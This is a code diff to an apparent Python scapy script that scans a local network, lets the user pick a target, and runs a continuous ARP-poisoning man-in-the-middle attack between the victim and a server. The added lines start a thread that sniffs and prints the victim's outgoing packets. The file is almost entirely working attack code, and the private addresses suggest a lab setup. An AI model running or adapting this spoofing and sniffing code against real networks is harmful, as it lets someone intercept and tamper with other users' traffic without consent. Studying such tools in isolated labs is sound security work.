@@ -1,9 +1,10 @@
 import scapy.all as scapy
 import time
+import threading
 
 #Define victim IP and Server IP -> automatize, let user select victim also implement sniffing instead of spamming
 VICTIM_IP = "192.168.50.20"
-SERVER_IP = "192.168.50.30"
+SERVER_IP = "192.168.50.40"
 INTERFACE = "eth1"
 NETWORK_RANGE = "192.168.50.0/24"
 
@@ -31,22 +32,33 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_ip_mac, psrc=source_ip, hwsrc=source_ip_mac)
     scapy.sendp(ether_frame / packet, count=5, verbose=False, iface=INTERFACE)
 
+def sniff_outgoing_packets(victim_ip):
+    def packet_callback(packet):
+        print(packet.summary())
+    print(f"Starting to sniff outgoing packets from {victim_ip}...")
+    scapy.sniff(prn=packet_callback, filter=f"ip src {victim_ip}", store=0, iface=INTERFACE)
+
 def run_spoofing(victim=VICTIM_IP, server=SERVER_IP):
+    # Start sniffing thread
+    sniff_thread = threading.Thread(target=sniff_outgoing_packets, args=(victim,), daemon=True)
+    sniff_thread.start()
+
     sent_packets_count = 0
+    print(f"Starting ARP poisoning: {victim} <-> {server}")
     try:
         while True:
             spoof(victim, server)
             spoof(server, victim)
             
             sent_packets_count = sent_packets_count + 2
-            print(f"\r[+] Packets Sent: {sent_packets_count}", end="")
+            print(f"\rPackets Sent: {sent_packets_count}", end="")
             
             time.sleep(2)
 
     except KeyboardInterrupt:
-        # Restore only while testing
         restore(victim, server)
         restore(server, victim)
+        print("\nAttack stopped and ARP tables restored")
 
 def main():
     request = scapy.ARP(pdst=NETWORK_RANGE)
@@ -62,9 +74,10 @@ def main():
     print("IP\t\t\tMAC Address\n-----------------------------------------")
     for host in hosts:
         print(f"{host['ip']}\t\t{host['mac']}")
-    request_input = input("Select the target IP address: ")
+    request_input = input("Select the target IP address: ").strip()
     if request_input in [host['ip'] for host in hosts]:    
         run_spoofing(request_input)
+    else: print("\nInvalid target")
 
 if __name__ == "__main__":
     main()
